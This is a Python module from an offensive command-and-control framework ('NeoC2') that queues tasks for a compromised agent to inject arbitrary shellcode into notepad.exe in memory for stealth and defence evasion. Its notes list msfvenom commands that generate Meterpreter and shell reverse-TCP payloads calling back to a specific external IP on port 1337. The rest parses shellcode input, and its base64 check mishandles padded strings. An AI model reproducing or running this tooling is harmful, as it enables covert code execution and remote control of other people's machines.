import os
import importlib.util
import base64
import re

def get_info():
    return {
        "name": "pinject",
        "description": "Stealthily inject shellcode into a target process (notepad.exe) on Windows systems without touching disk",
        "type": "exploitation",
        "platform": "windows",
        "author": "NeoC2 Framework by @stillbigjosh",
        "references": [
            "https://github.com/stillbigjosh/NeoC2",
            "https://www.rapid7.com/docs/msfvenom/"
        ],
        "technique_id": "T1055",  # Process Injection
        "mitre_tactics": ["Defense Evasion", "Privilege Escalation"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run process injection on",
                "required": True
            },
            "shellcode": {
                "description": "The shellcode to inject, either as raw bytes, hex string, or msfvenom base64 output",
                "required": True
            }
        },
        "notes": {
            "msfvenom_examples": [
                "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=89.116.49.235 LPORT=1337 -f raw | base64",
                "msfvenom -p windows/x64/exec CMD='calc.exe' -f raw | base64",
                "msfvenom -p windows/x64/shell_reverse_tcp LHOST=89.116.49.235 LPORT=1337 -f raw | base64"
            ]
        }
    }


def execute(options, session):
    agent_id = options.get("agent_id")
    shellcode_input = options.get("shellcode")

    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }

    if not shellcode_input:
        return {
            "success": False,
            "error": "shellcode is required"
        }

    session.current_agent = agent_id

    try:
        shellcode_bytes = process_shellcode_input(shellcode_input)
    except ValueError as e:
        return {
            "success": False,
            "error": f"Invalid shellcode format: {str(e)}"
        }

    # Base64 encode the shellcode bytes
    encoded_shellcode = base64.b64encode(shellcode_bytes).decode('utf-8')

    command = f"shellcode {encoded_shellcode}"

    # Check if this is being executed in interactive mode
    if hasattr(session, 'is_interactive_execution') and session.is_interactive_execution:
        # Return the command that should be executed interactively
        return {
            "success": True,
            "output": f"[x] Process injection prepared for interactive mode",
            "command": command,
            "target_process": "notepad.exe"
        }
    elif not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }
    else:
        # Queue the task on the agent
        try:
            agent_manager = session.agent_manager
            task_id = agent_manager.add_task(agent_id, command)
            if task_id:
                return {
                    "success": True,
                    "output": f"[x] Process injection task {task_id} queued for agent {agent_id}",
                    "task_id": task_id,
                    "target_process": "notepad.exe"
                }
            else:
                return {
                    "success": False,
                    "error": f"Failed to queue task for agent {agent_id}"
                }
        except Exception as e:
            return {
                "success": False,
                "error": f"Error queuing task: {str(e)}"
            }


def process_shellcode_input(shellcode_input):
    if isinstance(shellcode_input, bytes):
        return shellcode_input

    if not isinstance(shellcode_input, str):
        raise ValueError("Shellcode must be a string or bytes")

    # Check if it's base64 encoded (common from msfvenom)
    if is_base64(shellcode_input):
        try:
            return base64.b64decode(shellcode_input)
        except Exception:
            pass  # Not valid base64, continue to other formats

    clean_hex = shellcode_input.replace('0x', '').replace(',', '').replace('\\', '').replace(' ', '').replace('\n', '').replace('\t', '')

    if re.match(r'^[0-9a-fA-F]+$', clean_hex) and len(clean_hex) % 2 == 0:
        try:
            return bytes.fromhex(clean_hex)
        except ValueError:
            raise ValueError("Invalid hex string for shellcode")

    # If it's not base64 or hex, treat as raw string (less common)
    return shellcode_input.encode('utf-8')


def is_base64(s):
    try:
        if len(s) % 4 != 0:
            return False

        if not re.match(r'^[A-Za-z0-9+/]*={0,2}$', s):
            return False

        decoded = base64.b64decode(s)
        encoded = base64.b64encode(decoded).decode('utf-8')
        return encoded == s.strip('=')
    except Exception:
        return False
